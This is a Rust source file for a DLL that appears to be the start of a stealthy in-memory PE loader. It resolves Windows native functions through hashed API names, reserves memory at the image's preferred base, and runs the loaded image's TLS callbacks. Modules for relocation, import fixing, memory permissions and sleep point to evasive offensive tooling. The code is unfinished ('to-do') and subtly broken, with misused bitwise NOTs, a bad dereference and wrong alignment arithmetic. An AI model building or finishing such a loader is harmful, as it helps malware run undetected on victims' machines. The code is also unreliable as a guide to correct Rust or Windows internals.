#![no_std]
#![no_main]

#![allow(non_snake_case)]
#![allow(non_camel_case_types)]

pub use core::{ffi::c_void, arch::asm, slice::from_raw_parts, mem::size_of};

pub use windows_sys::{
    Win32::{
        System::{
            Kernel::{
                NT_TIB,
                LIST_ENTRY
            },
            SystemServices::{
                DLL_PROCESS_ATTACH,
                IMAGE_DOS_HEADER,
                IMAGE_DOS_SIGNATURE,
                IMAGE_NT_SIGNATURE,
                IMAGE_EXPORT_DIRECTORY,
                IMAGE_TLS_DIRECTORY64,
                IMAGE_TLS_DIRECTORY32,
                PIMAGE_TLS_CALLBACK,
                IMAGE_IMPORT_BY_NAME,
                IMAGE_ORDINAL_FLAG64
            },
            Threading::{
                PPS_POST_PROCESS_INIT_ROUTINE,
                PTP_WORK,
                PTP_WORK_CALLBACK,
                TP_CALLBACK_ENVIRON_V3,
                RTL_USER_PROCESS_PARAMETERS,
                PTP_CALLBACK_INSTANCE
            },
            Diagnostics::{
                Debug::{
                    IMAGE_DIRECTORY_ENTRY_EXPORT,
                    IMAGE_NT_HEADERS32,
                    IMAGE_NT_HEADERS64,
                    IMAGE_DIRECTORY_ENTRY_TLS,
                    CONTEXT
                }
            },
            Memory::{
                PAGE_READONLY, MEM_RESERVE
            },
            WindowsProgramming::{
                CLIENT_ID, IMAGE_THUNK_DATA64, IMAGE_THUNK_DATA32
            },
        },
        Foundation::{
            BOOLEAN,
            BOOL,
            NTSTATUS,
            HMODULE,
            FARPROC,
            UNICODE_STRING
        }
    }
};

use crate::{
    api_hashing::get_function_address,
    callback::nt_alloc_args
};

mod api_hashing;
mod reloc;
mod fix_iat;
mod fix_memory_perms;
mod callback;
mod sleep;

pub const TP_ALLOC_WORK_HASH: u32 = 0xB8CF6EF3;
pub const TP_POST_WORK_HASH: u32 = 0x8F4BD5EE;
pub const TP_RELEASE_WORK_HASH: u32 = 0xAB78109;
pub const LOAD_LIBRARY_A_HASH: u32 =  0x514D6A17;
pub const NT_PROTECT_HASH: u32 = 0x3D7A5DC4;
pub const NT_ALLOC_HASH: u32 = 0x763B95A8;

#[export_name = "_fltused"]
static _FLTUSED: i32 = 0;

#[cfg(not(test))]
#[panic_handler]
fn panic(_info: &core::panic::PanicInfo) -> ! { loop {} }

#[no_mangle]
pub unsafe extern "system" fn _DllMainCRTStartup(
    _module: HMODULE,
    _call_reason: u32,
    _reserved: *mut c_void,
) -> BOOL {
    1
}

#[link_section = ".text"]
#[no_mangle]
pub unsafe extern "system" fn ClementineInit(pe_address: *mut c_void, kernel32_address: isize, ntdll_address: isize) {

    if pe_address.is_null() || (!kernel32_address &&!ntdll_address) {
        return;
    }

    let base_address = pe_address as usize;
    #[cfg(target_arch = "x86_64")]
        let nt_header = (base_address + (*(base_address as *mut IMAGE_DOS_HEADER)).e_lfanew as usize) as *mut IMAGE_NT_HEADERS64;
    #[cfg(target_arch = "x86")]
        let nt_header = (base_address + (*(base_address as *mut IMAGE_DOS_HEADER)).e_lfanew as usize) as *mut IMAGE_NT_HEADERS32;

    /*
     *  Inject the PE in chunks
     *  If loaded at it's preferred address, skip relocation
     */

    let pe_size = (*nt_header).OptionalHeader.SizeOfImage as usize;
    let pe_preferred_address = (*nt_header).OptionalHeader.ImageBase as *mut c_void;

    let nt_alloc_ptr: usize = get_function_address(ntdll_address, NT_ALLOC_HASH).unwrap();

    let padded_pe_size: usize = pe_size + 4096 & !4096;
    let mut alloc = nt_alloc_args {
        function_pointer: nt_alloc_ptr,
        process: -1,
        address: pe_preferred_address,
        size: *padded_pe_size,
        permissions: PAGE_READONLY,
        alloc_type: MEM_RESERVE
    };


    // to-do

    // Execute TLS callbacks, if they exist
    if !(*nt_header).OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS as usize].Size {
        #[cfg(target_arch = "x86_64")]
            let image_tls_directory = (base_address + (*nt_header).OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS as usize].VirtualAddress as usize) as *mut IMAGE_TLS_DIRECTORY64;
        #[cfg(target_arch = "x86")]
            let image_tls_directory = (base_address + (*nt_header).OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS as usize].VirtualAddress as usize) as *mut IMAGE_TLS_DIRECTORY32;

        let mut tls_callback = (*image_tls_directory).AddressOfCallBacks as *mut PIMAGE_TLS_CALLBACK;

        type tls_prototype = unsafe extern "system" fn(dll_handle: *mut c_void, dw_reason: u32, reserved: *mut c_void);

        while !(*tls_callback.is_null()) {

            let _fn = (**tls_callback) as tls_prototype;
            _fn(pe_address, 1, 0 as *mut c_void);

            tls_callback = tls_callback.offset(1);
        }
    }

}